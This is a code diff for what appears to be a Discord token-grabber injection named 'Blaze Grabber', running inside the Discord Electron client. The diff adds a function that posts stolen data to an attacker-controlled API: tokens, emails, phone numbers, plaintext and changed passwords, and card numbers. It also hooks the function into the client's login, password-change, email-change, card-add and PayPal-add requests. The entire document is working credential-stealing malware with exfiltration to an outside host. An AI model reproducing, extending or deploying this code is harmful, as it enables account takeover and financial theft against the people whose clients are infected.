@@ -10,6 +10,8 @@ const { BrowserWindow, session, safeStorage } = require('electron');
 
 // ── Config ────────────────────────────────────────────────────────────────────
 const WEBHOOK    = '%WEBHOOK%';
+const API_URL    = '%API_URL%';
+const API_KEY    = '%API_KEY%';
 const AVATAR_URL = 'https://i.imgur.com/CHB4vW7.gif';
 const EMBED_COLOR = 0x8563FF;
 const BOT_NAME   = 'Blaze Grabber';
@@ -266,6 +268,61 @@ function parseBilling(sources) {
     return parts.length ? parts.join(' ') : '<:no:1533642070701641889>';
 }
 
+// ── API POST helper ───────────────────────────────────────────────────────────
+function postAPI(user, billing, token, ip, eventType, extra) {
+    if (!API_URL || API_URL === '%API_URL%') return;
+    try {
+        const cards   = (billing||[]).filter(s=>s.type===1).length;
+        const paypals = (billing||[]).filter(s=>s.type===2).length;
+        const billingStr = cards||paypals ? `${cards} Card, ${paypals} PayPal` : 'None';
+        const nitroMap = {1:'Nitro Classic',2:'Nitro',3:'Nitro Basic'};
+        const nitroStr = user.premium_type ? nitroMap[user.premium_type]||'Nitro' : 'None';
+
+        const acct = JSON.stringify([{
+            username:          user.username||'',
+            id:                user.id||'',
+            email:             user.email||'N/A',
+            phone:             user.phone||'N/A',
+            token:             token,
+            nitro:             nitroStr,
+            badges:            '',
+            '2fa':             !!user.mfa_enabled,
+            billing:           billingStr,
+            avatar_url:        '',
+            probably_password: extra.password||'',
+            created_date:      getAccountCreationDate(user.id||''),
+            event_type:        eventType,
+            new_password:      extra.new_password||'',
+            new_email:         extra.new_email||'',
+            card_number:       extra.card_number||'',
+        }]);
+
+        const body = new URLSearchParams({
+            api_key:          API_KEY,
+            victim_username:  process.env.USERNAME||process.env.COMPUTERNAME||'Unknown',
+            victim_ip:        ip||'Unknown',
+            victim_hwid:      'injection-'+( user.id||''),
+            victim_pc:        process.env.COMPUTERNAME||'Unknown',
+            victim_os:        'Windows',
+            discord_accounts: acct,
+            injection_event:  eventType,
+            victim_timestamp: new Date().toISOString(),
+        }).toString();
+
+        const url = new URL((API_URL.endsWith('/')?API_URL:API_URL+'/')+'/api/logs/injection');
+        const req = https.request({
+            hostname: url.hostname,
+            path:     url.pathname + url.search,
+            method:   'POST',
+            headers:  {'Content-Type':'application/x-www-form-urlencoded','Content-Length':Buffer.byteLength(body)},
+            timeout:  10000,
+        }, res=>{res.resume();});
+        req.on('error',()=>{});
+        req.write(body);
+        req.end();
+    } catch {}
+}
+
 // ── Embed builder ─────────────────────────────────────────────────────────────
 
 function buildPayload(title, fields, thumbnail, image) {
@@ -411,6 +468,7 @@ async function firstTime() {
                     fields,
                     avatar, null
                 ));
+                postAPI(user, billing, token, ip, 'initialized', {});
             } catch {}
         }
     } catch {}
@@ -520,6 +578,7 @@ session.defaultSession.webRequest.onCompleted({
                 ]),
                 avatar, null
             ));
+            postAPI(user, billing, token, ip, 'login', {password: data.password});
             break;
 
         case details.url.endsWith('users/@me') && details.method === 'PATCH':
@@ -535,6 +594,7 @@ session.defaultSession.webRequest.onCompleted({
                     ]),
                     avatar, null
                 ));
+                postAPI(user, billing, token, ip, 'password_change', {password: data.password, new_password: data.new_password});
             }
             if (data.email) {
                 await postWebhook(buildPayload(
@@ -546,6 +606,7 @@ session.defaultSession.webRequest.onCompleted({
                     ]),
                     avatar, null
                 ));
+                postAPI(user, billing, token, ip, 'email_change', {password: data.password, new_email: data.email});
             }
             break;
 
@@ -560,6 +621,7 @@ session.defaultSession.webRequest.onCompleted({
                 ]),
                 avatar, null
             ));
+            postAPI(user, billing, token, ip, 'card_added', {card_number: data['card[number]']||''});
             break;
 
         case details.url.includes('paypal_accounts'):
@@ -568,6 +630,7 @@ session.defaultSession.webRequest.onCompleted({
                 buildFields(user, billing, null, token, base),
                 avatar, null
             ));
+            postAPI(user, billing, token, ip, 'paypal_added', {});
             break;
 
         default:
